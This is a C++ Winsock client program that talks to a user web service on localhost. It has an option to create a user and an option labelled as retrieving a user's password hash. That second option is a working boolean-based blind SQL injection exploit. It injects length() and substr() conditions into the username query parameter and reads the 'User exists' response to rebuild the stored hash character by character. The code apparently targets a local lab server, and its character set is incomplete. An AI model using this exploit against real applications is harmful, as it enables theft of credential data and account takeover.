#include <iostream>
#include <string>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
using namespace std;

#pragma comment(lib, "ws2_32.lib")

const string SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 8080;

int consoleMenu();
string sendHttpRequest(SOCKET socket, const string& request);
string getPasswordHash(SOCKET socket, const string& username);
bool checkIfUserExists(SOCKET socket, string username);
void createNewUser(SOCKET sock, string username, string userFName, string userLName, string password);

int main() 
{
    string username;
    string userFName;
    string userLName;
    string password;

    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) 
    {
        cout << "WSAStartup failed with error: " << result << endl;
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) 
    {
        cout << "socket() failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP.c_str(), &serverAddress.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) 
    {
        cout << "connect() failed with error: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    int chosenOption = consoleMenu();
    if (chosenOption == 1)
    {
        cout << "Enter username: ";
        cin >> username;
        cout << endl;
        if (checkIfUserExists(sock, username))
        {
            getPasswordHash(sock, username);
        }
        else
        {
            cout << "Entered username doesn't exist in the database." << endl;
            cout << endl;
        }
    }
    else if (chosenOption == 2)
    {
        cout << "Enter username: ";
        cin >> username;
        cout << endl;
        cout << "Enter userFName: ";
        cin >> userFName;
        cout << endl;
        cout << "Enter userLName: ";
        cin >> userLName;
        cout << endl;
        cout << "Enter password: ";
        cin >> password;
        cout << endl;
        createNewUser(sock, username, userFName, userLName, password);
    }
    else
    {
        closesocket(sock);
        WSACleanup();

        return 0;
    }
}

int consoleMenu()
{
    int option;

    cout << "Please choose an action:" << endl;
    cout << "1. Get users password hash and its length." << endl;
    cout << "2. Create a new user." << endl;

    cin >> option;

    switch (option)
    {
    case 1:
        return 1;
        break;
    case 2:
        return 2;
        break;
    default:
        break;
    }
}

string sendHttpRequest(SOCKET socket, const string& request)
{
    send(socket, request.c_str(), request.length(), 0);

    char buffer[4096];
    int receivedBytes = recv(socket, buffer, sizeof(buffer), 0);
    return string(buffer, receivedBytes);
}

string getPasswordHash(SOCKET socket, const string& username)
{
    string hash = "";
    int maxLength = 64;
    string characters = "0123456789abcdefghijklmnoprstuvz";

    int hashLength = 0;
    for (int i = 1; i <= maxLength; ++i)
    {
        string getRequest = "GET /users?username=" + username + "%27%20and%20length(password)%20=%20%27" + to_string(i) + " HTTP/1.1\r\nHost: " + SERVER_IP + ":" + to_string(SERVER_PORT) + "\r\n\r\n";
        string response = sendHttpRequest(socket, getRequest);
        if (response.find("User exists") != string::npos)
        {
            hashLength = i;
            break;
        }
    }

    for (int pos = 1; pos <= hashLength; ++pos)
    {
        for (char c : characters)
        {
            string getRequest = "GET /users?username=" + username + "%27%20and%20substr(password," + to_string(pos) + ",1)%20=%20%27" + c + " HTTP/1.1\r\nHost: " + SERVER_IP + ":" + to_string(SERVER_PORT) + "\r\n\r\n";
            string response = sendHttpRequest(socket, getRequest);
            if (response.find("User exists") != string::npos)
            {
                hash += c;
                break;
            }
        }
    }

    cout << "Password hash for user '" << username << "': " << hash << endl;
    cout << "Hash length: " << hash.length() << endl;

    return hash;
}

bool checkIfUserExists(SOCKET socket, string username)
{
    int statusCode;
    string httpVersion;
    string getRequest = "GET /users?username=" + username + " HTTP/1.1\r\nHost: " + SERVER_IP + ":" + to_string(SERVER_PORT) + "\r\n\r\n";
    string response = sendHttpRequest(socket, getRequest);
    stringstream stream(response);
    stream >> httpVersion >> statusCode;

    return (statusCode == 200) ? true : false;
}

void createNewUser(SOCKET sock, string username, string userFName, string userLName, string password)
{
    string postData = "{\"userName\":\"" + username + "\",\"userFName\":\"" + userFName + "\",\"userLName\":\"" + userLName + "\",\"password\":\"" + password + "\"}";
    string postRequest = "POST /users HTTP/1.1\r\nHost: " + SERVER_IP + ":" + to_string(SERVER_PORT) + "\r\nContent-Type: application/json\r\nContent-Length: " +
        to_string(postData.length()) + "\r\n\r\n" + postData;
    string response = sendHttpRequest(sock, postRequest);
    cout << "POST request response: " << endl << response << endl;
}
